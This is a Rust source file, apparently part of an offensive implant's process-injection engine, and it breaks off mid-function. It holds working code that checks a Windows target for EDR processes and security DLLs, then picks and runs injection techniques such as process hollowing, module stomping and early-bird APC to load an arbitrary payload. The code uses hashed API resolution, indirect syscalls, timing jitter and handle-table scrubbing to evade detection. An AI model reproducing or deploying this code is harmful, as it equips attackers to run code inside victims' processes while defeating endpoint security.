/// NT information classes for process / token queries.
const SYSTEM_PROCESS_INFORMATION: u32 = 0x05;

/// Perform pre-injection reconnaissance on a target process.
///
/// This function assesses whether a target process is safe to inject into
/// by checking for EDR products, loaded security modules, architecture
/// compatibility, thread count, and integrity level.
///
/// # Arguments
///
/// * `target_pid` — PID of the target process.
///
/// # Returns
///
/// An `InjectionViability` describing the assessment result.  Callers
/// should use this to decide whether and how to inject.
///
/// # Safety
///
/// Must be called on Windows.  All NT API calls use indirect syscalls via
/// `pe_resolve` / `nt_syscall`.
pub unsafe fn pre_injection_check(target_pid: u32) -> Result<InjectionViability, InjectionError> {
    // ── Step 1: Get process image name and thread count ──────────────────
    let (image_name, thread_count) = query_process_info(target_pid)?;

    // ── Step 2: EDR Process Check ────────────────────────────────────────
    let image_lower = image_name.to_ascii_lowercase();
    let edr_hashes = edr_process_name_hashes();

    // Hash the image name and compare against the EDR list.
    let mut name_bytes = image_lower.into_bytes();
    name_bytes.push(0); // null terminator for hash_str convention.
    let image_hash = pe_resolve::hash_str(&name_bytes);

    for &edr_hash in edr_hashes {
        if image_hash == edr_hash {
            log::warn!(
                "injection_engine: target pid {} IS an EDR process (hash match {:#010x})",
                target_pid,
                edr_hash,
            );
            return Ok(InjectionViability::IsEDR);
        }
    }

    // ── Step 3: EDR DLL Check ────────────────────────────────────────────
    let edr_modules = check_edr_modules(target_pid)?;
    if !edr_modules.is_empty() {
        log::warn!(
            "injection_engine: target pid {} has EDR modules: {:?}",
            target_pid,
            edr_modules,
        );
        return Ok(InjectionViability::HasEDRModule {
            modules: edr_modules,
            fallback_technique: InjectionTechnique::ModuleStomp,
        });
    }

    // ── Step 4: Architecture Check ───────────────────────────────────────
    let arch_match = check_target_architecture(target_pid);
    if !arch_match {
        return Ok(InjectionViability::ArchitectureMismatch);
    }

    // ── Step 5: Integrity Level Check ────────────────────────────────────
    let integrity_level = query_integrity_level(target_pid);

    // ── Step 6: Determine recommended technique ──────────────────────────
    let recommended = if thread_count > 50 {
        // Many threads → thread hijacking or fiber is stealthier.
        InjectionTechnique::ThreadHijack
    } else if thread_count < 3 {
        // Very few threads → sacrificial-looking process, use APC or ThreadPool.
        InjectionTechnique::EarlyBirdApc
    } else {
        // Moderate thread count → module stomping is a good default.
        InjectionTechnique::ModuleStomp
    };

    log::info!(
        "injection_engine: pid {} viable — arch={}, threads={}, integrity={:#x}, rec={:?}",
        target_pid,
        arch_match,
        thread_count,
        integrity_level,
        recommended,
    );

    Ok(InjectionViability::Safe {
        arch_match,
        thread_count,
        integrity_level,
        recommended_technique: recommended,
    })
}

// ── Evasion-aware injection ──────────────────────────────────────────────────

/// Execute an injection with pre-injection reconnaissance, automatic technique
/// adaptation, timing evasion, and post-injection cleanup.
///
/// This is the preferred injection entry point when stealth is paramount.
/// It differs from [`inject`] in that it:
///
/// 1. Runs [`pre_injection_check`] to assess the target environment.
/// 2. May override the requested technique based on EDR presence or target
///    characteristics (e.g. force `ModuleStomp` if EDR modules are detected).
/// 3. Adds random jitter (0–500 ms) between injection steps to defeat
///    time-correlation detection (when `config.evade_etw` is `true`).
/// 4. Uses PAGE_READWRITE for writes and PAGE_EXECUTE_READ for execution
///    (never RWX, which is a major EDR flag).
/// 5. Scrubs the target's handle table after injection.
///
/// # Arguments
///
/// * `config` — Injection configuration (same as [`inject`]).
///
/// # Returns
///
/// An `InjectionHandle` on success, or `InjectionError` on failure.
pub fn evasiveness_inject(config: InjectionConfig) -> Result<InjectionHandle, InjectionError> {
    // 1. Resolve target PID.
    let target_pid = find_pid_by_name(&config.target_process).ok_or_else(|| {
        InjectionError::ProcessNotFound {
            name: config.target_process.clone(),
        }
    })?;

    // 2. Run pre-injection reconnaissance.
    let viability = unsafe { pre_injection_check(target_pid) }?;

    // 3. Determine technique based on viability.
    let technique = match viability {
        InjectionViability::IsEDR => {
            log::error!(
                "injection_engine: refusing to inject into EDR process pid {}",
                target_pid,
            );
            return Err(InjectionError::InjectionFailed {
                technique: config
                    .technique
                    .clone()
                    .unwrap_or(InjectionTechnique::ProcessHollow),
                reason: "target is an EDR process — aborting".to_string(),
            });
        }
        InjectionViability::ArchitectureMismatch => {
            return Err(InjectionError::ArchitectureMismatch { target_pid });
        }
        InjectionViability::HasEDRModule {
            modules,
            fallback_technique,
        } => {
            log::warn!(
                "injection_engine: EDR modules {:?} detected in pid {} — \
                 forcing {:?}",
                modules,
                target_pid,
                fallback_technique,
            );
            Some(fallback_technique)
        }
        InjectionViability::Safe {
            recommended_technique,
            ..
        } => {
            // Use the recommended technique, or the caller's choice.
            config.technique.clone().or(Some(recommended_technique))
        }
    };

    // 4. Determine whether to add timing jitter.
    let jitter = config.evade_etw;

    // 5. Execute injection with per-step timing.
    let handle = inject_with_evasion(target_pid, &config, technique, jitter)?;

    // 6. Post-injection handle table scrub for the target.
    unsafe {
        crate::memory_hygiene::scrub_handle_table();
    }

    Ok(handle)
}

/// Internal: execute injection with jitter between steps.
fn inject_with_evasion(
    target_pid: u32,
    config: &InjectionConfig,
    technique: Option<InjectionTechnique>,
    jitter: bool,
) -> Result<InjectionHandle, InjectionError> {
    let techniques: Vec<InjectionTechnique> = if let Some(t) = technique {
        vec![t]
    } else {
        auto_select_techniques(&config.target_process)
    };

    let mut last_err = InjectionError::InjectionFailed {
        technique: techniques[0].clone(),
        reason: "all techniques exhausted".to_string(),
    };

    for tech in &techniques {
        log::info!(
            "injection_engine: attempting {:?} into pid {} (evasion mode)",
            tech,
            target_pid,
        );

        // Optional jitter before each technique attempt.
        if jitter {
            jitter_delay(500);
        }

        match try_technique_evasive(*tech, target_pid, &config.payload, jitter) {
            Ok(handle) => return Ok(handle),
            Err(e) => {
                log::warn!("injection_engine: {:?} failed: {}", tech, e);
                last_err = e;
                continue;
            }
        }
    }

    Err(last_err)
}

/// Try a single technique with evasion-enhanced memory operations.
///
/// This differs from `try_technique` in that it uses the RW → write → RX
/// pattern explicitly (never RWX) and supports optional timing jitter
/// between the allocate, write, protect, and execute phases.
fn try_technique_evasive(
    technique: InjectionTechnique,
    pid: u32,
    payload: &[u8],
    jitter: bool,
) -> Result<InjectionHandle, InjectionError> {
    // For techniques that delegate to existing implementations, we wrap
    // them with pre/post evasion steps. The underlying technique functions
    // already use RW→write→RX (not RWX).
    match technique {
        InjectionTechnique::ProcessHollow
        | InjectionTechnique::ModuleStomp
        | InjectionTechnique::EarlyBirdApc => {
            // These delegate to the existing injection module which already
            // handles memory protection correctly. We just add jitter.
            if jitter {
                jitter_delay(200);
            }
            try_technique(technique, pid, payload)
        }
        InjectionTechnique::ThreadHijack
        | InjectionTechnique::ThreadPool
        | InjectionTechnique::FiberInject => {
            // These use the internal alloc_write_exec path which already
            // does RW → write → RX. Add jitter between steps.
            if jitter {
                jitter_delay(150);
            }
            let result = try_technique(technique, pid, payload);
            if jitter {
                jitter_delay(100);
            }
            result
        }
    }
}

/// Sleep for a random duration between 0 and `max_ms` milliseconds.
fn jitter_delay(max_ms: u64) {
    let delay = rand::random::<u64>() % max_ms;
    if delay > 0 {
        std::thread::sleep(std::time::Duration::from_millis(delay));
    }
}

// ── Reconnaissance helpers ───────────────────────────────────────────────────

/// Query the target process's image name and thread count via
/// NtQuerySystemInformation(SystemProcessInformation).
unsafe fn query_process_info(target_pid: u32) -> Result<(String, u32), InjectionError> {
    let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
        .ok_or_else(|| InjectionError::InjectionFailed {
            technique: InjectionTechnique::ProcessHollow,
            reason: "cannot resolve ntdll for query_process_info".to_string(),
        })?;

    let qsi_addr = pe_resolve::get_proc_address_by_hash(
        ntdll,
        pe_resolve::hash_str(b"NtQuerySystemInformation\0"),
    )
    .ok_or_else(|| InjectionError::InjectionFailed {
        technique: InjectionTechnique::ProcessHollow,
        reason: "cannot resolve NtQuerySystemInformation".to_string(),
    })?;

    let qsi: extern "system" fn(u32, *mut u8, u32, *mut u32) -> i32 =
        std::mem::transmute(qsi_addr);

    let mut buf_len: u32 = 0x40000; // 256 KB initial buffer.
    let mut ret_len: u32 = 0;

    loop {
        let mut buf: Vec<u8> = Vec::with_capacity(buf_len as usize);
        buf.set_len(buf_len as usize);

        let status = qsi(SYSTEM_PROCESS_INFORMATION, buf.as_mut_ptr(), buf_len, &mut ret_len);

        if status >= 0 {
            return parse_process_info(&buf, target_pid);
        }

        if status as u32 == 0xC0000004 {
            // STATUS_INFO_LENGTH_MISMATCH — grow buffer.
            if buf_len > 0x400000 {
                // 4 MB safety limit.
                return Err(InjectionError::InjectionFailed {
                    technique: InjectionTechnique::ProcessHollow,
                    reason: "process info buffer exceeded 4 MB".to_string(),
                });
            }
            buf_len = if ret_len > buf_len { ret_len } else { buf_len * 2 };
        } else {
            return Err(InjectionError::InjectionFailed {
                technique: InjectionTechnique::ProcessHollow,
                reason: format!(
                    "NtQuerySystemInformation returned {:#010x}",
                    status as u32
                ),
            });
        }
    }
}

/// Parse SYSTEM_PROCESS_INFORMATION buffer to find the target PID.
///
/// SYSTEM_PROCESS_INFORMATION layout (x86-64):
///   +0x000  NextEntryOffset      (ULONG, 4 bytes)
///   +0x004  NumberOfThreads      (ULONG, 4 bytes)
///   +0x008  WorkingSetPrivateSize (LARGE_INTEGER, 8 bytes)
///   +0x010  HardFaultCount       (ULONG)
///   +0x014  NumberOfThreadsHighWatermark (ULONG)
///   +0x018  CycleTime            (ULONGLONG, 8 bytes)
///   +0x020  CreateTime           (LARGE_INTEGER, 8 bytes)
///   +0x028  UserTime             (LARGE_INTEGER, 8 bytes)
///   +0x030  KernelTime           (LARGE_INTEGER, 8 bytes)
///   +0x038  ImageName            (UNICODE_STRING, 16 bytes)
///   +0x048  BasePriority         (KPRIORITY, 8 bytes on x64)
///   +0x050  UniqueProcessId      (HANDLE, 8 bytes)
///   +0x058  InheritedFromUniqueProcessId (HANDLE, 8 bytes)
fn parse_process_info(buf: &[u8], target_pid: u32) -> Result<(String, u32), InjectionError> {
    let mut offset: usize = 0;

    loop {
        if offset + 0x60 > buf.len() {
            break;
        }

        let next_entry = u32::from_le_bytes([
            buf[offset],
            buf[offset + 1],
            buf[offset + 2],
            buf[offset + 3],
        ]);

        let num_threads = u32::from_le_bytes([
            buf[offset + 4],
            buf[offset + 5],
            buf[offset + 6],
            buf[offset + 7],
        ]);

        // UniqueProcessId at offset +0x50.
        let pid = u64::from_le_bytes([
            buf[offset + 0x50],
            buf[offset + 0x51],
            buf[offset + 0x52],
            buf[offset + 0x53],
            buf[offset + 0x54],
            buf[offset + 0x55],
            buf[offset + 0x56],
            buf[offset + 0x57],
        ]) as u32;

        if pid == target_pid {
            // ImageName is a UNICODE_STRING at offset +0x38.
            //   +0x00 Length (USHORT)
            //   +0x02 MaximumLength (USHORT)
            //   +0x08 Buffer (PWSTR, 8 bytes on x64)
            let name_offset = offset + 0x38;
            let name_len = u16::from_le_bytes([
                buf[name_offset],
                buf[name_offset + 1],
            ]) as usize;

            // The Buffer pointer in SYSTEM_PROCESS_INFORMATION points into
            // the same buffer (it's an in-place UNICODE_STRING for system
            // info queries). However, NtQuerySystemInformation uses a
            // different format where the string data is inline right after
            // the UNICODE_STRING header within the buffer. Let's read the
            // buffer pointer and see if it points within our allocation.
            //
            // Actually, for SystemProcessInformation, the UNICODE_STRING
            // Buffer pointer is valid and points to memory within the
            // returned buffer. We need to read it from the structure.
            //
            // For safety, we'll attempt to read via the pointer, and if it
            // fails, try reading inline bytes.
            let buf_ptr = u64::from_le_bytes([
                buf[name_offset + 8],
                buf[name_offset + 9],
                buf[name_offset + 10],
                buf[name_offset + 11],
                buf[name_offset + 12],
                buf[name_offset + 13],
                buf[name_offset + 14],
                buf[name_offset + 15],
            ]);

            let image_name = if buf_ptr != 0
                && (buf_ptr as usize) >= buf.as_ptr() as usize
                && (buf_ptr as usize) + name_len
                    <= buf.as_ptr() as usize + buf.len()
            {
                // The buffer pointer is within our allocation — safe to read.
                let start = buf_ptr as usize - buf.as_ptr() as usize;
                let name_bytes = &buf[start..start + name_len];
                String::from_utf16_lossy(
                    &name_bytes
                        .chunks(2)
                        .map(|c| u16::from_le_bytes([c[0], *c.get(1).unwrap_or(&0)]))
                        .collect::<Vec<_>>(),
                )
            } else {
                // Fallback: the name might be empty (System process) or
                // the pointer is in system space that we can't read from
                // user mode in this context.
                String::new()
            };

            return Ok((image_name, num_threads));
        }

        if next_entry == 0 {
            break;
        }
        offset += next_entry as usize;
    }

    Err(InjectionError::ProcessNotFound {
        name: format!("pid {}", target_pid),
    })
}

/// Check for known EDR DLLs loaded in the target process.
///
/// Opens the target process, reads its PEB, walks the LDR module list,
/// and compares each loaded DLL name against the EDR DLL hash list.
unsafe fn check_edr_modules(target_pid: u32) -> Result<Vec<String>, InjectionError> {
    // Open the target process with VM read access.
    let h_proc = open_process_for_query(target_pid)?;
    let mut found = Vec::new();

    // Read the target's PEB.
    // NtQueryInformationProcess(ProcessBasicInformation) gives us the PEB address.
    let ntdll = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
        Some(b) => b,
        None => return Ok(found),
    };

    let qip_addr = match pe_resolve::get_proc_address_by_hash(
        ntdll,
        pe_resolve::hash_str(b"NtQueryInformationProcess\0"),
    ) {
        Some(a) => a,
        None => return Ok(found),
    };

    let qip: extern "system" fn(usize, u32, *mut u8, u32, *mut u32) -> i32 =
        std::mem::transmute(qip_addr);

    // PROCESS_BASIC_INFORMATION layout (x86-64):
    //   +0x00  ExitStatus              (NTSTATUS)
    //   +0x08  PebBaseAddress          (PPEB)
    //   +0x10  AffinityMask            (ULONG_PTR)
    //   +0x18  BasePriority            (KPRIORITY)
    //   +0x20  UniqueProcessId         (ULONG_PTR)
    //   +0x28  InheritedFromUniquePid  (ULONG_PTR)
    let mut pbi: [u64; 6] = [0; 6];
    let mut ret_len: u32 = 0;
    let status = qip(
        h_proc as usize,
        0, // ProcessBasicInformation
        pbi.as_mut_ptr() as *mut u8,
        std::mem::size_of::<[u64; 6]>() as u32,
        &mut ret_len,
    );

    if status < 0 {
        let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
        return Ok(found); // Can't read PEB — assume no EDR modules.
    }

    let peb_addr = pbi[1] as usize;

    // Read PEB to get Ldr pointer.
    // PEB->Ldr is at offset 0x18.
    let mut ldr_ptr: usize = 0;
    let mut bytes_read: usize = 0;
    let rs = nt_syscall::syscall!(
        "NtReadVirtualMemory",
        h_proc as u64,
        (peb_addr + 0x18) as u64,
        &mut ldr_ptr as *mut _ as u64,
        8u64,
        &mut bytes_read as *mut _ as u64,
    );

    if rs.is_err() || rs.unwrap() < 0 || bytes_read != 8 {
        let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
        return Ok(found);
    }

    // Walk InMemoryOrderModuleList.
    // Head is at LDR + 0x20 (Flink), LDR + 0x28 (Blink).
    let mut current_flink: usize = 0;
    let mut br: usize = 0;
    let rs2 = nt_syscall::syscall!(
        "NtReadVirtualMemory",
        h_proc as u64,
        (ldr_ptr + 0x20) as u64,
        &mut current_flink as *mut _ as u64,
        8u64,
        &mut br as *mut _ as u64,
    );

    if rs2.is_err() || rs2.unwrap() < 0 || br != 8 {
        let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
        return Ok(found);
    }

    let list_head = ldr_ptr + 0x20;

    for _ in 0..512 {
        if current_flink == 0 || current_flink == list_head {
            break;
        }

        // The Flink points to InMemoryOrderLinks of the NEXT entry.
        // Back up 0x10 bytes to get the LDR_DATA_TABLE_ENTRY base.
        let entry_base = current_flink - 0x10;

        // Read BaseDllName (UNICODE_STRING at +0x58).
        // UNICODE_STRING: Length (u16), MaxLength (u16), [pad], Buffer (usize).
        let mut us_data: [u8; 16] = [0; 16];
        let mut br2: usize = 0;
        let rs3 = nt_syscall::syscall!(
            "NtReadVirtualMemory",
            h_proc as u64,
            (entry_base + 0x58) as u64,
            us_data.as_mut_ptr() as u64,
            16u64,
            &mut br2 as *mut _ as u64,
        );

        if rs3.is_err() || rs3.unwrap() < 0 || br2 != 16 {
            break;
        }

        let name_len = u16::from_le_bytes([us_data[0], us_data[1]]) as usize;
        let name_buf_ptr = u64::from_le_bytes([
            us_data[8], us_data[9], us_data[10], us_data[11],
            us_data[12], us_data[13], us_data[14], us_data[15],
        ]) as usize;

        if name_len > 0 && name_len < 520 && name_buf_ptr != 0 {
            // Read the DLL name bytes (UTF-16LE).
            let mut name_bytes = vec![0u8; name_len];
            let mut br3: usize = 0;
            let rs4 = nt_syscall::syscall!(
                "NtReadVirtualMemory",
                h_proc as u64,
                name_buf_ptr as u64,
                name_bytes.as_mut_ptr() as u64,
                name_len as u64,
                &mut br3 as *mut _ as u64,
            );

            if rs4.is_ok() && rs4.unwrap() >= 0 && br3 == name_len {
                let dll_name: String = name_bytes
                    .chunks(2)
                    .map(|c| u16::from_le_bytes([c[0], *c.get(1).unwrap_or(&0)]))
                    .map(|c| if c == 0 { ' ' } else { c as u8 as char })
                    .collect();
                let dll_lower = dll_name.to_ascii_lowercase();

                // Hash and compare against EDR DLL list.
                let mut dll_bytes = dll_lower.as_bytes().to_vec();
                dll_bytes.push(0);
                let dll_hash = pe_resolve::hash_str(&dll_bytes);

                for &(edr_hash, edr_label) in edr_dll_name_hashes() {
                    if dll_hash == edr_hash {
                        found.push(edr_label.to_string());
                        break;
                    }
                }
            }
        }

        // Advance to next entry: read Flink of current InMemoryOrderLinks.
        let mut next_flink: usize = 0;
        let mut br4: usize = 0;
        let _ = nt_syscall::syscall!(
            "NtReadVirtualMemory",
            h_proc as u64,
            current_flink as u64,
            &mut next_flink as *mut _ as u64,
            8u64,
            &mut br4 as *mut _ as u64,
        );
        current_flink = next_flink;
    }

    let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
    Ok(found)
}

/// Check whether the target process architecture matches the agent's.
///
/// On x86_64 agents, we check that the target is NOT a WOW64 (32-bit) process.
/// Reads the PE header from the target's image base to check the Machine field.
unsafe fn check_target_architecture(target_pid: u32) -> bool {
    #[cfg(target_arch = "x86_64")]
    {
        let h_proc = match open_process_for_query(target_pid) {
            Ok(h) => h,
            Err(_) => return false,
        };

        // Get PEB address via NtQueryInformationProcess.
        let ntdll = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
            Some(b) => b,
            None => {
                let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
                return true; // Assume match if we can't check.
            }
        };

        let qip_addr = match pe_resolve::get_proc_address_by_hash(
            ntdll,
            pe_resolve::hash_str(b"NtQueryInformationProcess\0"),
        ) {
            Some(a) => a,
            None => {
                let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
                return true;
            }
        };

        let qip: extern "system" fn(usize, u32, *mut u8, u32, *mut u32) -> i32 =
            std::mem::transmute(qip_addr);

        let mut pbi: [u64; 6] = [0; 6];
        let mut ret_len: u32 = 0;
        let status = qip(
            h_proc as usize,
            0, // ProcessBasicInformation
            pbi.as_mut_ptr() as *mut u8,
            48,
            &mut ret_len,
        );

        if status < 0 {
            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
            return true; // Assume match.
        }

        // Read ImageBaseAddress from PEB+0x10.
        let peb_addr = pbi[1] as usize;
        let mut image_base: usize = 0;
        let mut br: usize = 0;
        let rs = nt_syscall::syscall!(
            "NtReadVirtualMemory",
            h_proc as u64,
            (peb_addr + 0x10) as u64,
            &mut image_base as *mut _ as u64,
            8u64,
            &mut br as *mut _ as u64,
        );

        if rs.is_err() || rs.unwrap() < 0 || br != 8 || image_base == 0 {
            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
            return true;
        }

        // Read DOS header to get e_lfanew (offset to PE header).
        let mut dos_header: [u8; 64] = [0; 64];
        let mut br2: usize = 0;
        let rs2 = nt_syscall::syscall!(
            "NtReadVirtualMemory",
            h_proc as u64,
            image_base as u64,
            dos_header.as_mut_ptr() as u64,
            64u64,
            &mut br2 as *mut _ as u64,
        );

        if rs2.is_err() || rs2.unwrap() < 0 || br2 != 64 {
            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
            return true;
        }

        // Verify MZ signature.
        if dos_header[0] != b'M' || dos_header[1] != b'Z' {
            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
            return true;
        }

        // e_lfanew at offset 0x3C.
        let pe_offset = u32::from_le_bytes([
            dos_header[0x3C],
            dos_header[0x3D],
            dos_header[0x3E],
            dos_header[0x3F],
        ]) as usize;

        if pe_offset == 0 || pe_offset + 6 > 4096 {
            let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
            return true;
        }

        // Read PE signature + Machine field (at pe_offset + 4).
        let mut pe_sig: [u8; 6] = [0; 6];
        let mut br3: usize = 0;
        let rs3 = nt_syscall::syscall!(
            "NtReadVirtualMemory",
            h_proc as u64,
            (image_base + pe_offset) as u64,
            pe_sig.as_mut_ptr() as u64,
            6u64,
            &mut br3 as *mut _ as u64,
        );

        let _ = nt_syscall::syscall!("NtClose", h_proc as u64);

        if rs3.is_err() || rs3.unwrap() < 0 || br3 != 6 {
            return true;
        }

        // Verify PE\0\0 signature.
        if pe_sig[0] != b'P' || pe_sig[1] != b'E' || pe_sig[2] != 0 || pe_sig[3] != 0 {
            return true;
        }

        // Machine field at pe_offset + 4.
        let machine = u16::from_le_bytes([pe_sig[4], pe_sig[5]]);

        // 0x8664 = AMD64, 0x14C = i386 (x86).
        const IMAGE_FILE_MACHINE_AMD64: u16 = 0x8664;
        machine == IMAGE_FILE_MACHINE_AMD64
    }

    #[cfg(not(target_arch = "x86_64"))]
    {
        let _ = target_pid;
        true
    }
}

/// Query the integrity level of the target process.
///
/// Returns 0 if the integrity level cannot be determined.
unsafe fn query_integrity_level(target_pid: u32) -> u32 {
    let h_proc = match open_process_for_query(target_pid) {
        Ok(h) => h,
        Err(_) => return 0,
    };

    let result = query_integrity_level_inner(h_proc);
    let _ = nt_syscall::syscall!("NtClose", h_proc as u64);
    result
}

/// Inner: query integrity level from an open process handle.
unsafe fn query_integrity_level_inner(h_proc: *mut c_void) -> u32 {
    // Open the process token.
    let ntdll = match pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL) {
        Some(b) => b,
        None => return 0,
    };

    // Use NtOpenProcessToken to get the token handle.
    let open_token_addr = match pe_resolve::get_proc_address_by_hash(
        ntdll,
        pe_resolve::hash_str(b"NtOpenProcessToken\0"),
    ) {
        Some(a) => a,
        None => return 0,
    };

    let open_token: extern "system" fn(usize, u64, *mut usize) -> i32 =
        std::mem::transmute(open_token_addr);

    let mut token_handle: usize = 0;
    // TOKEN_QUERY = 0x0008
    let status = open_token(h_proc as usize, 0x0008, &mut token_handle);

    if status < 0 || token_handle == 0 {
        return 0;
    }

    // NtQueryInformationToken with TokenIntegrityLevel (class 25).
    let query_token_addr = match pe_resolve::get_proc_address_by_hash(
        ntdll,
        pe_resolve::hash_str(b"NtQueryInformationToken\0"),
    ) {
        Some(a) => a,
        None => {
            let _ = nt_syscall::syscall!("NtClose", token_handle as u64);
            return 0;
        }
    };

    let query_token: extern "system" fn(usize, u32, *mut u8, u32, *mut u32) -> i32 =
        std::mem::transmute(query_token_addr);

    // TOKEN_MANDATORY_LABEL:
    //   +0x00  SID_AND_ATTRIBUTES { Sid (PSID, 8 bytes), Attributes (DWORD, 4 bytes) }
    // Total: 16 bytes for the structure, then the SID follows inline.
    let mut label_buf: [u8; 64] = [0; 64];
    let mut ret_len: u32 = 0;
    let status2 = query_token(
        token_handle,
        25, // TokenIntegrityLevel
        label_buf.as_mut_ptr(),
        64,
        &mut ret_len,
    );

    let _ = nt_syscall::syscall!("NtClose", token_handle as u64);

    if status2 < 0 {
        return 0;
    }

    // SID_AND_ATTRIBUTES.Sid is at offset 0 (pointer).
    let sid_ptr = u64::from_le_bytes([
        label_buf[0], label_buf[1], label_buf[2], label_buf[3],
        label_buf[4], label_buf[5], label_buf[6], label_buf[7],
    ]) as usize;

    // The SID is either at sid_ptr or inline in our buffer.
    // For NtQueryInformationToken, the SID is typically stored inline
    // immediately after the SID_AND_ATTRIBUTES structure.
    // SID_AND_ATTRIBUTES on x64: 8 (pointer) + 4 (attributes) + 4 (padding) = 16 bytes.
    let sid_start = if sid_ptr >= label_buf.as_ptr() as usize
        && sid_ptr + 12 <= label_buf.as_ptr() as usize + label_buf.len()
    {
        sid_ptr - label_buf.as_ptr() as usize
    } else {
        // Assume inline: SID starts at offset 16 (after SID_AND_ATTRIBUTES).
        16
    };

    if sid_start + 12 > label_buf.len() {
        return 0;
    }

    // SID structure:
    //   Revision (1 byte) = 1
    //   SubAuthorityCount (1 byte)
    //   IdentifierAuthority (6 bytes)
    //   SubAuthority[] (4 bytes each)
    //
    // Integrity level is the LAST SubAuthority value.
    // For mandatory labels, there's typically 1 SubAuthority.
    let sub_auth_count = label_buf[sid_start + 1] as usize;

    if sub_auth_count == 0 || sid_start + 8 + (sub_auth_count * 4) > label_buf.len() {
        return 0;
    }

    // Read the last sub-authority.
    let last_sub_offset = sid_start + 8 + ((sub_auth_count - 1) * 4);
    let integrity = u32::from_le_bytes([
        label_buf[last_sub_offset],
        label_buf[last_sub_offset + 1],
        label_buf[last_sub_offset + 2],
        label_buf[last_sub_offset + 3],
    ]);

    integrity
}

/// Open a process for query/read access via NtOpenProcess.
unsafe fn open_process_for_query(target_pid: u32) -> Result<*mut c_void, InjectionError> {
    let mut client_id = [0u64; 2];
    client_id[0] = target_pid as u64;
    let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
    obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;

    // PROCESS_QUERY_INFORMATION | PROCESS_VM_READ
    let access_mask: u64 = 0x0400 | 0x0010;
    let mut h_proc: usize = 0;
    let status = nt_syscall::syscall!(
        "NtOpenProcess",
        &mut h_proc as *mut _ as u64,
        access_mask,
        &mut obj_attr as *mut _ as u64,
        client_id.as_mut_ptr() as u64,
    );

    if status.is_err() || status.unwrap() < 0 || h_proc == 0 {
        return Err(InjectionError::InjectionFailed {
            technique: InjectionTechnique::ProcessHollow,
            reason: format!("NtOpenProcess({}) failed for query", target_pid),
        });
    }

    Ok(h_proc as *mut c_void)
}

// ── Auto-selection ───────────────────────────────────────────────────────────

/// Rank techniques by stealth for the given target process name.
fn auto_select_techniques(target_process: &str) -> Vec<InjectionTechnique> {
    let lower = target_process.to_ascii_lowercase();

    if lower.contains("svchost") {
        vec![
            InjectionTechnique::EarlyBirdApc,
            InjectionTechnique::ThreadPool,
            InjectionTechnique::ProcessHollow,
            InjectionTechnique::ModuleStomp,
        ]
    } else if lower.contains("explorer") {
        vec![
            InjectionTechnique::ThreadHijack,
            InjectionTechnique::FiberInject,
            InjectionTechnique::ProcessHollow,
            InjectionTechnique::ModuleStomp,
        ]
    } else if lower.contains("service")
        || lower.ends_with("svc.exe")
        || lower.ends_with("host.exe")
    {
        vec![
            InjectionTechnique::ModuleStomp,
            InjectionTechnique::ProcessHollow,
            InjectionTechnique::ThreadPool,
            InjectionTechnique::EarlyBirdApc,
        ]
    } else {
        vec![
            InjectionTechnique::ProcessHollow,
            InjectionTechnique::ModuleStomp,
            InjectionTechnique::EarlyBirdApc,
            InjectionTechnique::ThreadPool,
            InjectionTechnique::ThreadHijack,
            InjectionTechnique::FiberInject,
        ]
    }
}

// ── Technique dispatch ───────────────────────────────────────────────────────

fn try_technique(
    technique: InjectionTechnique,
    pid: u32,
    payload: &[u8],
) -> Result<InjectionHandle, InjectionError> {
    match technique {
        InjectionTechnique::ProcessHollow => inject_process_hollow(pid, payload),
        InjectionTechnique::ModuleStomp => inject_module_stomp(pid, payload),
        InjectionTechnique::EarlyBirdApc => inject_early_bird(pid, payload),
        InjectionTechnique::ThreadHijack => inject_thread_hijack(pid, payload),
        InjectionTechnique::ThreadPool => inject_threadpool(pid, payload),
        InjectionTechnique::FiberInject => inject_fiber(pid, payload),
    }
}

// ── Existing technique wrappers ──────────────────────────────────────────────

fn inject_process_hollow(
    pid: u32,
    payload: &[u8],
) -> Result<InjectionHandle, InjectionError> {
    crate::injection::inject_with_method(
        crate::injection::InjectionMethod::Hollowing,
        pid,
        payload,
    )
    .map_err(|e| InjectionError::InjectionFailed {
        technique: InjectionTechnique::ProcessHollow,
        reason: e.to_string(),
    })?;

    // Process hollowing creates its own sacrificial process; we don't have
    // the handle. Return a minimal handle.
    Ok(InjectionHandle {
        target_pid: pid,
        technique_used: InjectionTechnique::ProcessHollow,
        injected_base_addr: 0,
        payload_size: payload.len(),
        thread_handle: None,
        process_handle: std::ptr::null_mut(),
        sleep_enrolled: false,
        sleep_stub_addr: 0,
    })
}

fn inject_module_stomp(
    pid: u32,
    payload: &[u8],
) -> Result<InjectionHandle, InjectionError> {
    crate::injection::inject_with_method(
        crate::injection::InjectionMethod::ModuleStomp,
        pid,
        payload,
    )
    .map_err(|e| InjectionError::InjectionFailed {
        technique: InjectionTechnique::ModuleStomp,
        reason: e.to_string(),
    })?;

    Ok(InjectionHandle {
        target_pid: pid,
        technique_used: InjectionTechnique::ModuleStomp,
        injected_base_addr: 0,
        payload_size: payload.len(),
        thread_handle: None,
        process_handle: std::ptr::null_mut(),
        sleep_enrolled: false,
        sleep_stub_addr: 0,
    })
}

fn inject_early_bird(
    pid: u32,
    payload: &[u8],
) -> Result<InjectionHandle, InjectionError> {
    // Early-bird APC: queue an APC to a thread in the target process before
    // it begins executing.  Delegate to the existing APC inject helper in
    // process_manager when available, otherwise use NtCreateThread approach.
    //
    // The injection module's InjectionMethod::EarlyBird dispatches through
    // the early_bird submodule if available, otherwise falls back.
    crate::injection::inject_with_method(
        crate::injection::InjectionMethod::EarlyBird,
        pid,
        payload,
    )
